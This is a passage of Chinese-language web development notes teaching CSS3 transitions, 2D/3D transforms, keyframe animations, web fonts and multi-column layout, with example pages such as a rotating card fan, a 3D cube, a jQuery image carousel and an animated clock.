        }
        .item > .itemBox{
            width: 100%;
            height:0px;
            overflow: hidden;
            /*display: none;*/
            /*添加过渡效果:过渡效果只能产生从某个值到另外一个具体的值的过渡*/
            /*1.一定要设置为哪些css样式添加过渡效果*/
            /*transition-property: display;*/
            transition-property: height;
            /*2.一定要设置过渡效果的耗时*/
            transition-duration: 1s;
        }
        /*给包含整的div 加样式*/
        .item:hover>.itemBox{
            height: 110px;
        }
    </style>
</head>
<body>
<div class="menu">
    <div class="item">
        <h3>市内新闻</h3>
        <div class="itemBox">
            <ul>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
            </ul>
        </div>
    </div>
    <div class="item">
        <h3>省内新闻</h3>
        <div class="itemBox">
            <ul>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
            </ul>
        </div>
    </div>
    <div class="item">
        <h3>国内新闻</h3>
        <div class="itemBox">
            <ul>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
            </ul>
        </div>
    </div>
    <div class="item">
        <h3>国际新闻</h3>
        <div class="itemBox">
            <ul>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
                <li>深圳超市肉菜档遭抢</li>
            </ul>
        </div>
    </div>
</div></body>
</html>
```
[2D水平移动](2D水平移动.md)
[2D的方大缩放效果](2D的方大缩放效果.md)
[2D旋转](2D围绕中心旋转.md)
[2D斜切](2D斜切.md)
[2D旋转扑克牌案例](2D旋转扑克牌案例.md)
[盾牌案例](实现多个属性作用.md)
[实现居中定位](实现居中定位.md)

>[success] # 让div2D移动
```
1.使用transform实现元素的移动 a.移动是参照元素的左上角 b.执行完毕之后会恢复到原始状态
2.如果只有一个参数就代表x方向 ： transform: translate(100px)
3.如果有两个参数就代表x/y方向 ： transform: translate(400px,500px);
4.设置x反向：transform:translateX(300px);
5.设置Y方向transform:translateY(300px);
```
>[danger] ##### 案例
```
    <style>
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            /*可以直接设置但没有动画效果*/
            /*transform: translate(100px);*/
            /*利用了transition 绑定了transform 形成动画效果*/
            transition: transform 2s;
        }
        div:first-of-type:active{
            /*使用transform实现元素的移动 a.移动是参照元素的左上角 b.执行完毕之后会恢复到原始状态
            1.如果只有一个参数就代表x方向
            2.如果有两个参数就代表x/y方向*/
            /*transform: translate(100px);*/
            /*transform: translate(400px,500px);*/
            /*transform: translate(0px,500px);*/

            /*添加水平或者垂直方向的移动*/
            /*transform:translateX(300px);*/
            transform:translateY(300px);
        }

    </style>
</head>
<body>
<div></div>
</body>
```
>[success] # 2D缩放scale
```
1.给transform 添加scale缩放属性1指不缩放，>1.01放大  <0.99缩小  参照元素的几何中心
2.如果有两个参数，就代表x/y方向
```
>[danger] ##### 案例
```
    <style>
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            transition: transform 2s;
        }
        div:first-of-type:active{
            /*实现缩放  1指不缩放，>1.01放大  <0.99缩小  参照元素的几何中心
           1.如果只有一个参数，就代表x和y方向都进行相等比例的缩放
           2.如果有两个参数，就代表x/y方向*/
            /*transform: scale(2);*/
            /*transform: scale(2,1);*/
            /*缩放指定的方向 */
            /*transform:scaleX(0.5);*/
            transform:scaleY(0.5);
        }

    </style>
</head>
<body>
<div></div>
```
>[success] # rotate 一中心点角度旋转
```
1.transform:rotate(-90deg); 中心点角度旋转负数逆时针，整数顺时针
2.设置旋转中心点设置旋转轴心 1.x y 2.关键字：left top right bottom center
 transform-origin: left top;
```
>[danger] ##### 案例
```
    <style>
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            transition: transform 2s;

        }
        div:first-of-type:active{
            transform:rotate(-90deg);
        }

    </style>
</head>
<body>
<div></div>
```

>[danger] ##### 右上旋转
```
    <style>
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            transition: transform 2s;
            transform-origin: left top;
        }
        div:first-of-type:active{
        transform:rotate(-90deg);

}

</style>
</head>
<body>
<div></div>
```
>[success] # 案例
![](https://box.kancloud.cn/103db6edaf67beadee7f6d77918c41ef_143x116.png)
```
    <style>
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            transition: transform 2s;

        }
        div:first-of-type:active{
            background-color: blue;
            /*如果角度为正，则往当前轴的负方向斜切，如果角度为，则往当前轴的正方向斜切*/
            transform:skew(-30deg);
            /*transform:skew(30deg,-30deg);*/
            /*设置某个方向的斜切值*/
            /*transform:skewX(30deg);*/
            /*transform:skewY(30deg);*/        }

    </style>
</head>
<body>
<div></div>
```
>[success] # 案例
![](https://box.kancloud.cn/e57ea4fd10e1549b3e4fbafe07639c1e_525x505.png)
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .pkBox{
            width: 155px;
            height: 219px;
            position: relative;
            margin:300px auto;
        }
        .pkBox > img{
            width: 100%;
            height: 100%;
            position: absolute;
            left: 0;
            top: 0;
            /*添加过渡*/
            transition: transform 2s;
            /*设置旋转轴心*/
            transform-origin: right top;
        }
        /*添加鼠标上移的效果*/
        .pkBox:hover >img:nth-of-type(1){
             transform: rotate(60deg);
         }
        .pkBox:hover >img:nth-of-type(2){
            transform: rotate(120deg);
        }
        .pkBox:hover >img:nth-of-type(3){
            transform: rotate(180deg);
        }
        .pkBox:hover >img:nth-of-type(4){
            transform: rotate(240deg);
        }
        .pkBox:hover >img:nth-of-type(5){
            transform: rotate(300deg);
        }
        .pkBox:hover >img:nth-of-type(6){
            transform: rotate(360deg);
        }
    </style>
</head>
<body>
<div class="pkBox">
    <img src="../images/pk1.png" alt="">
    <img src="../images/pk2.png" alt="">
    <img src="../images/pk1.png" alt="">
    <img src="../images/pk2.png" alt="">
    <img src="../images/pk1.png" alt="">
    <img src="../images/pk2.png" alt="">
</div>
```
>[success] # 多个2D属性
```
1.一定要先移动在旋转
2.transform: translate(-150px,-150px) rotate(60deg);
```
>[danger] ##### 盾牌案例
![](https://box.kancloud.cn/9ee81db9da409304ada3a0b561722b9e_664x511.png)
```
1.先是一个完整的盾牌
2.打乱顺序
3.鼠标停留删除 transform 属性
```
```
 <style>
        *{
            padding: 0;
            margin: 0;
        }
        body{
            background-color: #31965b;
        }
        .box{
            width: 440px;
            margin:100px auto;
        }
        .box > img{
            transition: transform 1s;
        }
        .box > img:nth-of-type(1){
            transform: translate(100px,100px) rotate(30deg);
        }
        .box > img:nth-of-type(2){
            transform: translate(-100px,-100px) rotate(-30deg);
        }
        .box > img:nth-of-type(3){
            transform: translate(200px,200px) rotate(60deg);
        }
        .box > img:nth-of-type(4){
            transform: translate(-200px,-200px) rotate(-60deg);
        }
        .box > img:nth-of-type(5){
            transform: translate(150px,150px) rotate(90deg);
        }
        .box > img:nth-of-type(6){
            transform: translate(50px,150px) rotate(-90deg);
        }
        .box > img:nth-of-type(7){
            transform: translate(-150px,-150px) rotate(60deg);
        }
        .box > img:nth-of-type(8){
            transform: translate(10px,-250px) rotate(-90deg);
        }
        .box > img:nth-of-type(9){
            transform: translate(-250px,10px) rotate(45deg);
        }

        .box:hover > img{
            transform: none;
        }
    </style>
</head>
<body>
<div class="box">
    <img src="../images/shield_1_01.png" alt="">
    <img src="../images/shield_1_02.png" alt="">
    <img src="../images/shield_1_03.png" alt="">
    <img src="../images/shield_1_04.png" alt="">
    <img src="../images/shield_1_05.png" alt="">
    <img src="../images/shield_1_06.png" alt="">
    <img src="../images/shield_1_07.png" alt="">
    <img src="../images/shield_1_08.png" alt="">
    <img src="../images/shield_1_09.png" alt="">
</div>
```
>[success] # 居中定位
```
1.普通定位需要找计算坐标
```
>[danger] ##### 案例
![](https://box.kancloud.cn/2280d95e70f68fca4bd9deccae14f4d0_489x459.png)
```
1.设置position 的定位百分比是根据父级元素长宽相乘
2.transform 是本身的长宽相乘
```
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 400px;
            height: 400px;
            border-radius: 200px;
            background-color: #ccc;
            margin:100px auto;
            position: relative;
        }
        .rec{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            /*定位的百分比是参照父容器的宽高*/
            left: 50%;
            top: 50%;
            /*使用transform实现元素的居中  百分比是参照元素本身的宽高*/
            transform: translate(-50%,-50%);
            /*transform: translate(-50px,-50px);*/
        }
    </style>
</head>
<body>
<div class="box">
    <div class="rec"></div>
</div>
```
[TOC]
>[success] # 3D
```
1.translate3d(X方向的偏移，Y方向的偏移，Z方向的偏移)
2.scale3d(x方向上的缩放，y方向的缩放，z方向的缩放)
3.rotate3d(x,y,z,angle): x:代表x轴方向上的一个向量值y:代表y轴方向上的一个向量值z:代表z轴方向上的一个向量值
```
* rotate3d 的偏移量，单独设置时候1就可以，和大小无关，但设置两个时候如图，根据偏移连接的轴旋转
![](https://box.kancloud.cn/4e3fb26ab1fb189c1a42c6ae474eeeff_238x190.png)

>[danger] ##### 代码
```
<style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            margin-left: 200px;
            margin-top:10px;
            /*添加过渡*/
            transition: transform 2s;
        }
        /*添加三维移动--3D移动*/
        div:first-of-type:active{
            /*translate3d(X方向的偏移，Y方向的偏移，Z方向的偏移)*/
            /*transform: translate3d(400px,0,0);*/
            /*transform: translate3d(400px,400px,0);*/
            transform: translate3d(0px,0px,400px);
        }
        /*添加三维缩放*/
        div:nth-of-type(2):active{
            /*scale3d(x方向上的缩放，y方向的缩放，z方向的缩放)
            >1.01 放大   <0.99 缩小*/
            /*transform:scale3d(2,0.5,10);*/
            transform:scale3d(1,1,10);
        }
        /*添加三维旋转*/
        div:nth-of-type(3):active{
            /*rotate3d(x,y,z,angle):
            x:代表x轴方向上的一个向量值
            y:代表y轴方向上的一个向量值
            z:代表z轴方向上的一个向量值*/
            transform: rotate3d(1,1,1,330deg);
        }
    </style>
</head>
<body>
<div>1</div>
<div>2</div>
<div>3</div>
<div>4</div>
```
>[success] ##### 详解
```
三维变换使用基于二维变换的相同属性，可以让我们基于三个坐标方向对元素进行变换。和二维变形一样，三维变形可以使用transform属性来设置
```
>[danger] ##### 3D移动
```
1.translate3d(x,y,z) 使元素在这三个纬度中移动,也可以分开写，如：translateX(length),translateY(length), translateZ(length)
```
*示例：
```
div:hover{
    /*Y轴移动+100px*/
    /*transform:translateY(100px);*/
    /*X轴移动100px*/
    /*transform:translateX(100px);*/
    /*x轴和Y轴方向同时移动*/
    transform:translate3d(100px,100px,0px);
}
```

>[danger] #####  3D缩放
```
1.scale3d(number,number,number) 使元素在这三个纬度中缩放，也可分开写，如：scaleX(),scaleY(),scaleZ()
```
* 示例
```
div:hover{
    /*Y轴方向放大1倍*/
    /*transform: scaleX(2);*/
    /*X轴方向缩小0.5*/
    /*transform: scaleX(0.5);*/
    /*x轴和Y轴方向同时进行缩放*/
    transform: scale3d(2,0.5,1);
}
```
>[danger] #####  3D旋转
```
a)	rotate3d(x,y,z,angle)：指定需要进行旋转的坐标轴
b)	rotateX(angle) 是元素依照x轴旋转；
c)	rotateY(angle) 是元素依照y轴旋转；
d)	rotateZ(angle) 是元素依照z轴旋转
```
* 案例：
```
div:hover{
    /*Y轴方向旋转45度*/
    /*transform: rotateY(45deg);*/
    /*X轴方向旋转90度*/
    /*transform: rotateX(90deg);*/
    /*x轴和Y轴方向同时进行旋转放*/
    transform: rotate3d(1,1,0,45deg);
}
```

>[success] # 画一个正方体
```
1.让子元素保留3D效果需要在父元素设置h)	transform-style
2.先设置六个div 在同一个位置，通过移动旋转拼接成一个正方体
3.perspective 类似摄像机对3D的观察角度，如果大于边长则在外面观察，小于则显示视角在内部
4.perspective-origin属性规定了镜头在平面上的位置。默认是放在元素的中心
```
>[danger] ##### 代码、
![](https://box.kancloud.cn/d9c7a40800ba7dc33c6c47ad9fe31e5d_355x308.png)
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 200px;
            height: 200px;
            margin:100px auto;
            position: relative;
            /*让box默认旋转，方便观察*/
            transform: rotate3d(1,1,0,30deg);
            /*让子元素保留3d变换之后的效果*/
            transform-style: preserve-3d;
            /*添加透视景深效果*/
            perspective: 0px;
            /*设置透视的观察角度*/
            perspective-origin: 0px 0px;
        }
        .box > div{
            width: 200px;
            height: 200px;
            position: absolute;
            opacity: 0.5;
        }
        .front{
            background-color: red;
            transform: translateZ(100px);
        }
        .back{
            background-color: green;
            transform: translateZ(-100px) rotateY(180deg);
        }
        .left{
            background-color: blue;
            /*移动+旋转*/
            transform: translateX(-100px) rotateY(-90deg);
        }
        .right{
            background-color: pink;
            transform: translateX(100px) rotateY(90deg);
        }
        .top{
            background-color: purple;
            transform: translateY(-100px) rotateX(90deg);
        }
        .bottom{
            background-color: orange;
            transform: translateY(100px) rotateX(-90deg);
        }
    </style>
</head>
<body>
<div class="box">
    <div class="front">front</div>
    <div class="back">back</div>
    <div class="left">left</div>
    <div class="right">right</div>
    <div class="top">top</div>
    <div class="bottom">bottom</div>
</div>
```
>[success] # 滚动轮播图
```
1.将图片分割成四个li，每个li里面的4个span为一个立方体
2.点击时候 用定时器作为节流阀连续点击初始化的恢复方法
```
>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .view{
            width: 560px;
            height: 300px;
            margin:100px auto;
            position: relative;
        }
        ul{
            width: 100%;
            height: 100%;
            list-style: none;
            /*transform: rotate3d(1,1,0,-30deg);*/
            transform-style: preserve-3d;
        }
        ul > li{
            width: 25%;
            height: 100%;
            float: left;
            position: relative;
            transform-style: preserve-3d;
            /*添加过渡效果*/
            transition: transform 0.5s;
        }
        ul > li > span{
            width: 100%;
            height: 100%;
            position: absolute;
            left: 0;
            top: 0;
        }
        ul > li > span:nth-of-type(1) {
            background: url("../images/q1.jpg");
            /*往z轴正方向偏移*/
            transform: translateZ(150px);
        }
        ul > li > span:nth-of-type(2){
            background: url("../images/q2.jpg");
            transform: translateY(-150px) rotateX(90deg);
        }
        ul > li > span:nth-of-type(3){
            background: url("../images/q3.jpg");
            transform: translateZ(-150px) rotateX(180deg);
        }
        ul > li > span:nth-of-type(4){
            background: url("../images/q4.jpg");
            transform: translateY(150px) rotateX(-90deg);
        }
        /*设置每一个li元素的span所显示的图片的位置*/
        ul > li:nth-of-type(2) > span {
            background-position: -100% 0;
        }
        ul > li:nth-of-type(3) > span {
            background-position: -200% 0;
        }
        ul > li:nth-of-type(4) > span {
            background-position: -300% 0;
        }
        ul > li:nth-of-type(5) > span {
            background-position: -400% 0;
        }

        .pre,.next{
            width: 60px;
            height: 60px;
            text-align: center;
            line-height:60px;
            position: absolute;
            top: 50%;
            text-decoration: none;
            font-size: 40px;
            transform: translate(0,-50%);
            background-color: rgba(0,0,0,0.5);
            color: #fff;
        }
        .pre{
            left: 0;
        }
        .next{
            right: 0;
        }
    </style>
</head>
<body>
<div class="view">
    <ul>
        <!--每一个li就是一个结构块-->
        <li>
            <!--每一个span是这个结构块中的某一个面，用来显示图片-->
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </li>
        <li>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </li>
        <li>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </li>
        <li>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </li>
        <!--<li>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </li>-->
    </ul>
    <a href="javascript:;" class="pre">&lt;</a>
    <a href="javascript:;" class="next">&gt;</a>
</div>
<script src="../js/jquery.min.js"></script>
<script>
    $(function(){
        /*定义图片索引*/
        var index=0;
        /*添加节流阀  true说明本次单击会有响应处理*/
        var flag=true;
        /*下一张*/
        $(".next").on("click",function(){
            if(flag==true){
                /*设置节流阀*/
                flag=false;
                index--;
                /*所谓下一张，就是将所有li元素围绕x旋转*/
                $("li").each(function(key,value){ //0 1 2 3 4
                    /*通过添加transform样式进行旋转*/
                    $(this).css({
                        "transform":"rotateX("+(index*90)+"deg)",
                        "transition-delay":(key*0.2)+"s"
                    });
                });
                setTimeout(function(){
                    flag=true;
                },1000);
            }
        });
        /*上一张*/
        $(".pre").on("click",function(){
            if(flag==true){
                /*设置节流阀*/
                flag=false;
                index++;
                /*所谓下一张，就是将所有li元素围绕x旋转*/
                $("li").each(function(key,value){ //0 1 2 3 4
                    /*通过添加transform样式进行旋转*/
                    $(this).css({
                        "transform":"rotateX("+(index*90)+"deg)",
                        "transition-delay":(key*0.2)+"s"
                    });
                });
                setTimeout(function(){
                    flag=true;
                },1000);
            }
        });
    });
</script>
</body>
</html>
```
>[success] # 帧动画效果
```
动画是CSS3中具有颠覆性的特征之一，可通过设置多个节点来精确控制一个或一 
组动画，常用来实现复杂的动画效果.
```
```
1.使用@keyframes 创建动画效果，里面可以用通过
    * 百分比将动画序列分割成多个节点，
    * 在各节点中分别定义各属性，
    * 使用animation-name 进行配对
2.使用animation 样式说明:
	* 动画序列的名称:animation-name: move;对应@keyframes 创建动画效果
 	* 动画的持续时间:animation-duration: 1s; 必须设置
 	* 动画循环次数，infinite无限循环，也可以指定数字，animation-iteration-count: infinite;
 	* 设置动画的延迟，2s后动画运行animation-delay: 2s
 	* 动画执行后会的回到最初状态设置animation-fill-mode，动画就可以保持最后的状态效果
 	* 动画运行的效果动画的时间函数animation-timing-function
 	* 设置动画的播放状态  paused:暂停   running:播放animation-play-state
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 100px;
            height: 100px;
            background-color: red;
            /*属性K对应的名字 必须和keyframes 对应绑定关系*/
            animation-name: moveTest;
            /*2.设置动画的总耗时*/
            animation-duration: 2s;
            /*3.设置动画的播放次数，默认为1次  可以指定具体的数值，也可以指定infinite(无限次)*/
            animation-iteration-count: 1;
            /*4.设置交替动画  alternate:来回交替，循环的动画效果*/
            animation-direction: alternate;
            /*5.设置动画的延迟，2s后动画运行*/
            animation-delay: 2s;
            /*5.设置动画结束时的状态：默认情况下，动画执行完毕之后，会回到原始状态
            forwards:会保留动画结束时的状态，在有延迟的情况下，并不会立刻进行到动画的初始状态
            backwards:不会保留动画结束时的状态，在添加了动画延迟的前提下，如果动画有初始状态，那么会立刻进行到初始状态
            both:会保留动画的结束时状态，在有延迟的情况下也会立刻进入到动画的初始状态*/
            animation-fill-mode: both;
            /*6.动画的时间函数，运行效果*/
            animation-timing-function: linear;
            /*设置动画的播放状态  paused:暂停   running:播放*/
            animation-play-state: running;

        }
        @keyframes moveTest {
            0%{
                transform: translate(0,0);
            }
            50%{
                transform: translate(0,500px);
            }
            100%{
                transform: translate(500px,600px);
            }
        }
    </style>
</head>
<body>
<div></div>
<input type="button" value="播放" id="play">
<input type="button" value="暂停" id="pause">
<script>
    var div=document.querySelector("div");
    document.querySelector("#play").onclick=function(){
        div.style.animationPlayState="running";
    }
    document.querySelector("#pause").onclick=function(){
        div.style.animationPlayState="paused";
    }
</script>
</body>
</html>
``` 
>[success] # 无缝滚动
![](https://box.kancloud.cn/2a7f4600c1d376c706a4ff87da190cf7_936x126.png)
```
1.ul无法撑开div的特性，div先设置宽度为7张图片的宽度
2.ul 为了能够放下14张照片宽度设置成200%
3.动画滚动完毕后会快速回到最开始所以设置数量*2
```
>[danger] ##### 案例
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 882px;
            height: 86px;
            margin:100px auto;
            background-color: #ddd;
            overflow: hidden;

        }
        div >ul{
            list-style: none;
            width: 200%;

            /*1.设置的名称*/
            animation-name: move;
            /*2.设置动画的耗时*/
            animation-duration: 7s;
            /*3.市场无限循环*/
            animation-iteration-count: infinite;
            /*4.设置时间函数*/
            animation-timing-function: linear;
        }
        div > ul > li{
            width:126px;
            float: left;
        }
        div > ul > li　> img{
            width:100%;
        }
        /*鼠标上移，停止动画*/
        div:hover > ul{
            cursor: pointer;
            animation-play-state: paused;
        }
        /*创建动画*/
        @keyframes move {
            from{
                transform:translateX(0);
            }
            to{
                transform:translateX(-882px);
            }
        }
    </style>
</head>
<body>
<div>
    <ul>
        <li><img src="../images/1.jpg" alt=""></li>
        <li><img src="../images/2.jpg" alt=""></li>
        <li><img src="../images/3.jpg" alt=""></li>
        <li><img src="../images/4.jpg" alt=""></li>
        <li><img src="../images/5.jpg" alt=""></li>
        <li><img src="../images/6.jpg" alt=""></li>
        <li><img src="../images/7.jpg" alt=""></li>
        <li><img src="../images/1.jpg" alt=""></li>
        <li><img src="../images/2.jpg" alt=""></li>
        <li><img src="../images/3.jpg" alt=""></li>
        <li><img src="../images/4.jpg" alt=""></li>
        <li><img src="../images/5.jpg" alt=""></li>
        <li><img src="../images/6.jpg" alt=""></li>
        <li><img src="../images/7.jpg" alt=""></li>
    </ul>
</div>
```
>[success] # 时钟案例

* 先画一个圆形，然后里面有根直线
![](https://box.kancloud.cn/4c55ce3b95dd237548fd44cbba761d5c_397x367.png)

* 画一个白色的圆形盖住中间
![](https://box.kancloud.cn/ab3739e5ed190153ae709044f14efba6_390x351.png)
>[danger] ##### 代码
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .clock{
            width: 300px;
            height: 300px;
            border: 10px solid #ccc;
            /*border-radius: 160px;*/
            /*百分比参照元素的实际宽高*/
            border-radius: 50%;
            margin:100px auto;
            position: relative;
        }
        .line{
            width: 8px;
            height: 300px;
            background-color: #ccc;
            position: absolute;
            /*参照父容器的宽*/
            left: 50%;
            top:0;
            /*参照元素本身*/
            transform: translate(-50%,0);
        }
        .line1,.line4{
            width: 10px;
        }
        .line2{
            transform: translate(-50%,0) rotate(30deg);
        }
        .line3{
            transform: translate(-50%,0) rotate(60deg);
        }
        .line4{
            transform: translate(-50%,0) rotate(90deg);
        }
        .line5{
            transform: translate(-50%,0) rotate(120deg);
        }
        .line6{
            transform: translate(-50%,0) rotate(150deg);
        }
        .cover{
            width: 250px;
            height: 250px;
            border-radius: 50%;
            background-color: #fff;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-50%);
        }
        .hour{
            width: 6px;
            height: 80px;
            background-color: red;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-100%);
            transform-origin: center bottom;
            animation: clockAnimation 43200s linear infinite;
        }
        .minute{
            width: 4px;
            height: 90px;
            background-color: green;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-100%);
            transform-origin: center bottom;
            animation: clockAnimation 3600s linear infinite;
        }
        .second{
            width: 2px;
            height: 100px;
            background-color: blue;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-100%);

            /*设置旋转轴心*/
            transform-origin: center bottom;
            /*添加动画*/
            animation: clockAnimation 60s infinite steps(60);
            /*steps(60)与animation-timing-function的其它属性冲突*/
            /*animation-timing-function: steps(60);*/
        }
        .center{
            width: 20px;
            height: 20px;
            background-color: #ccc;
            border-radius: 50%;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-50%);
        }

        /*创建动画*/
        @keyframes clockAnimation {
            from{
                transform:translate(-50%,-100%) rotate(0deg);
            }
            to{
                transform:translate(-50%,-100%) rotate(360deg);
            }
        }
    </style>
</head>
<body>
<div class="clock">
    <div class="line line1"></div>
    <div class="line line2"></div>
    <div class="line line3"></div>
    <div class="line line4"></div>
    <div class="line line5"></div>
    <div class="line line6"></div>
    <div class="cover"></div>
    <div class="hour"></div>
    <div class="minute"></div>
    <div class="second"></div>
    <div class="center"></div>
</div>
</body>
```
>[success] # 字体
```
开发人员可以为自已的网页指定特殊的字体，无需考虑用户电脑上是否安装了此特殊字体，从此把特殊字体处理成图片的时代便成为了过去。它的支持程度比较好，甚至IE低版本浏览器也能支持。
```
```
1.	字体格式
不同浏览器所支持的字体格式是不一样的，我们有必要了解一下有关字体格式的知识。
1、TureTpe(.ttf)格式
.ttf字体是Windows和Mac的最常见的字体，是一种RAW格式，支持这种字体的浏览器有IE9+、Firefox3.5+、Chrome4+、Safari3+、Opera10+、iOS Mobile、Safari4.2+；
2、OpenType(.otf)格式
.otf字体被认为是一种原始的字体格式，其内置在TureType的基础上，支持这种字体的浏览器有Firefox3.5+、Chrome4.0+、Safari3.1+、Opera10.0+、iOS Mobile、Safari4.2+；
3、Web Open Font Format(.woff)格式
woff字体是Web字体中最佳格式，他是一个开放的TrueType/OpenType的压缩版本，同时也支持元数据包的分离，支持这种字体的浏览器有IE9+、Firefox3.5+、Chrome6+、Safari3.6+、Opera11.1+；
4、Embedded Open Type(.eot)格式
.eot字体是IE专用字体，可以从TrueType创建此格式字体，支持这种字体的浏览器有IE4+；
5、SVG(.svg)格式
.svg字体是基于SVG字体渲染的一种格式，支持这种字体的浏览器有Chrome4+、Safari3.1+、Opera10.0+、iOS Mobile Safari3.2+
```
```
2.	字体图标
常见的是把网页常用的一些小的图标，借助工具帮我们生成一个字体包，然后就可以像使用文字一样使用图标了
a)	优点
	将所有图标打包成字体库，减少请求；
	具有矢量性，可保证清晰度；
	使用灵活，便于维护
b)	生成字体图标文件
a)	下载字体图标文件：如https://www.awesomes.cn/的网站的介绍和使用
 
b)	自定义字体
/*定义字体图标*/
@font-face {
    font-family: 'wjs'; //自定义的字体名称
    src: url('../fonts/MiFie-Web-Font.eot'); /* IE9*/
    src: url('../fonts/MiFie-Web-Font.eot') format('embedded-opentype'), /* IE6-IE8 */
    url('../fonts/MiFie-Web-Font.woff') format('woff'), /* chrome、firefox */
    url('../fonts/MiFie-Web-Font.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
    url('../fonts/MiFie-Web-Font.svg') format('svg'); /* iOS 4.1- */
}
c)	通过css样式使用字体
/*自定义字体图标*/
.wjs_font_icon{
    font-family: wjs; //这里对应着自定义的字体名称
}
/*手机图标对应的编码*/
.wjs_font_icon_phone::before{
    content: "\e908"; //指定显示的内容
}
```
>[danger] ##### 案例
![](https://box.kancloud.cn/3667d49def375056843f532986c1c3eb_1338x303.png)
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .wrapper {
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            /*设置多列布局*/
            /*1.设置列数*/
            column-count: 3;
            /*2.添加列间隙样式,与边框样式的添加一样*/
            column-rule: dashed 3px red;
            /*3。设置列间隙大小*/
            column-gap: 50px;
            /*4.设置列宽
            原则：取大优先
            1.如果人为设置宽度更大，则取更大的值，但是会填充整个屏幕，意味最终的宽度可能也会大于设置的宽度--填充满整个屏幕
            2.如果人为设置宽度更小，使用默认计算的宽度*/
            column-width: 200px;
        }
        h4{
            /*设置跨列显示  1  / all*/
            column-span: all;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <h4>CSS3简介</h4>
    <p>
        CSS即层叠样式表（Cascading StyleSheet）。 在网页制作时采用层叠样式表技术，可以有效地对页面的布局、字体、颜色、背景和其它效果实现更加精确的控制。 只要对相应的代码做一些简单的修改，就可以改变同一页面的不同部分，或者页数不同的网页的外观和格式。CSS3是CSS技术的升级版本，CSS3语言开发是朝着模块化发展的。以前的规范作为一个模块实在是太庞大而且比较复杂，所以，把它分解为一些小的模块，更多新的模块也被加入进来。这些模块包括： 盒子模型、列表模块、超链接方式 、语言模块 、背景和边框 、文字特效 、多栏布局等。
    </p>
    <p>1、
        CSS3圆角表格
        CSS3圆角表格
        圆角表格，对应属性：border-radius。
        2、以往对网页上的文字加特效只能用filter这个属性，这次CSS3中专门制订了一个加文字特效的属性，而且不止加阴影这种效果。对应属性：font-effect。
        3、丰富了对链接下划线的样式，以往的下划线都是直线，这次可不一样了，有波浪线、点线、虚线等等，更可对下划线的颜色和位置进行任意改变。（还有对应顶线和中横线的样式，效果与下划线类似）对应属性：text-underline-style，text-underline-color，text-underline-mode，text-underline-position。
        4、在文字下点几个点或打个圈以示重点，CSS3也开始加入了这项功能，这应该在某些特定网页上很有用。对应属性：font-emphasize-style和font-emphasize-position。
        边框
        border-color:控制边框颜色，并且有了更大的灵活性，可以产生渐变效果
    </p>
    <p>
        变形(transform)、转换(transition)和动画(animation)
        transform: rotate | scale | skew | translate |matrix;
        旋转rotate、扭曲skew、缩放scale和移动translate以及矩阵变形matrix。
        transition主要包含四个属性值：执行变换的属性：transition-property,变换延续的时间：transition-duration,在延续时间段，变换的速率变化transition-timing-function,变换延迟时间transition-delay。下面分别来看这四个属性值
        在开始介绍Animation之前我们有必要先来了解一个特殊的东西，那就是"Keyframes",我们把他叫做“关键帧”，玩过flash的朋友可能对这个东西并不会陌生。下面我们就一起来看看这个“Keyframes”是什么东西。前面我们在使用transition制作一个简单的transition效果时，我们包括了初始属性和最终属性，一个开始执行动作时间和一个延续动作时间以及动作的变换速率，其实这些值都是一个中间值，如果我们要控制的更细一些，比如说我要第一个时间段执行什么动作，第二个时间段执行什么动作（换到flash中说，就是第一帧我要执行什么动作，第二帧我要执行什么动作），这样我们用Transition就很难实现了，此时我们也需要这样的一个“关键帧”来控制。那么CSS3的Animation就是由“keyframes”这个属性来实现这样的效果。下面我们一起先来看看Keyframes:
